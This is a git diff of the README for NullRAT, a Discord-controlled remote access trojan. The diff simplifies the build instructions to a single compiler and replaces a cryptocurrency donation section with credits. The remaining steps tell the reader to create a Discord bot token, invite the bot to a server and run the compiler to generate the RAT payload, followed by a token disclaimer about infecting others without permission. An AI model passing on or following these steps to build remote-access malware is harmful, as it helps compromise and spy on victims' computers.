@@ -2,7 +2,7 @@
 ![NullRAT](https://user-images.githubusercontent.com/70959549/150108231-0c8a8b30-a3cf-4a94-8712-2277cd833731.png)
 
 <h3 align=center><b>The next-generation of Discord RATs</b></h3>
-<h6 align=center>"Please read the entire README and <a href="https://github.com/NullCode1337/NullRAT/blob/source/Getting%20Variables.md">Getting Variables.md</a> before using the RAT"</h4>
+<h6 align=center>Please read the entire README before using the RAT</h4>
 
 ---
 
@@ -83,88 +83,35 @@
 
 > # How to use:
 #### Requirements:
-- **Python 3.8+**:
-    - [This version is recommended for installing](https://www.python.org/ftp/python/3.8.10/python-3.8.10.exe) 
-    - Video on installing Python: [https://youtu.be/_ABg9TkYUXk](https://youtu.be/_ABg9TkYUXk)
-    - [Microsoft Store version of Python **WILL NOT WORK**]
- 
-- **PIP Folder added to path** (the path is `C:\Users\%username%\Appdata\Roaming\Python\Python38\Scripts` for me)
+- Nothing! The newly designed compiler will handle **everything** for your convenience!
 
 #### Preparation:
 - Create a Discord Bot and [get it's token](https://github.com/NullCode1337/NullRAT/blob/source/Getting%20Variables.md#discord-bot-token)
-- [Create a bot invite link with the correct scopes](https://github.com/NullCode1337/NullRAT/blob/source/Getting%20Variables.md#proper-bot-invite-link) and add it to your server
+- [Create a bot invite link](https://github.com/NullCode1337/NullRAT/blob/source/Getting%20Variables.md#proper-bot-invite-link) and add it to your server
 - Store the [Notification ID](https://github.com/NullCode1337/NullRAT/blob/source/Getting%20Variables.md#channel-id) and [Server ID](https://github.com/NullCode1337/NullRAT/blob/source/Getting%20Variables.md#server-ids) along with the token for ease of access
 
 #### Steps:
-1. Dowload the latest release of NullRAT (recommended) [**git clone**/**download zip** for dev builds]
-2. Run the AIO File and follow the prompts. NullRAT payload will be right there!
+1. Dowload the latest release of NullRAT (recommended) [**git clone**/**download zip** are no longer supported]
+2. Run the Compiler and follow the prompts. NullRAT payload will be right there!
 
 - **Video tutorial:** Soon
-- **NullRAT Discord:** [https://discord.com/invite/s9QANySc2q](https://discord.com/invite/s9QANySc2q)
+- **NullRAT Discord:** Soon
 
 
 </br>
 
 
-> # Donate:
+> # Credits:
 
-**Donations keep me running and motivated.
-I thank you in advance for your generous support**
+- Treeform for puppy
+- All my testers on GitHub
 
-<details>
-<summary>Monero XMR</summary>
-  
-</br>48ehSGucnMHFir7YYT9eDfDrXZcrRx9PEeFL52tyDRTz3ZYSbQpnzoaXW484TzvEHkDucLiGGa7nAgcVy7gZSbsuHqgL3Er
-</details>
+**Since this is a project I work on whenever I'm bored/depressed, you do not have the right to ask for any ETAs.**
 
-<details>
-<summary>BTC [BIP49] (SegWit)</summary>
-  
-</br>37fyekYxe6EaNYZyhkcNYi6djfbTTQndHc
+**Thank you for your consideration**
 
-![BTC_QR](https://user-images.githubusercontent.com/70959549/178553683-aaece326-92f6-48fb-a1cb-2c3847c66dbd.png)
-
-</details>
-
-<details>
-<summary>LTC [BIP49] (SegWit)</summary>
-  
-</br>MKxiQRMYcCPMmsBHEWr5fVsFo669k4hw6U
-
-![LTC_QR](https://user-images.githubusercontent.com/70959549/178554082-78f6d73b-4079-4c11-b207-3b7cd1f9f374.png)
-
-</details>
-
-<details>
-<summary>ETH (erc20)</summary>
-
-</br>0xbC9B3F1b7B687eA193f6f85c7AEF669597F3db02
-
-![ETH_QR](https://user-images.githubusercontent.com/70959549/178554327-f8f4346b-0e94-4000-98b9-f5150915b0c8.png)
-
-</details>
-
-<details>
-<summary>USDC [preferred] (erc20)</summary>
-  
-</br>0xbC9B3F1b7B687eA193f6f85c7AEF669597F3db02
-
-![USDC_QR](https://user-images.githubusercontent.com/70959549/178554327-f8f4346b-0e94-4000-98b9-f5150915b0c8.png)
-
-</details>
-
-<details>
-<summary>MATIC (Polygon)</summary>
-  
-</br>0xbC9B3F1b7B687eA193f6f85c7AEF669597F3db02
-
-![MATIC_QR](https://user-images.githubusercontent.com/70959549/178554327-f8f4346b-0e94-4000-98b9-f5150915b0c8.png)
-
-</details>
-
-
-</br>
-
+---
 
 **Infecting others via NullRAT without their permission is obviously not supported by me.**
+
 <h4 align=right>Software designed by NullCode</h6>
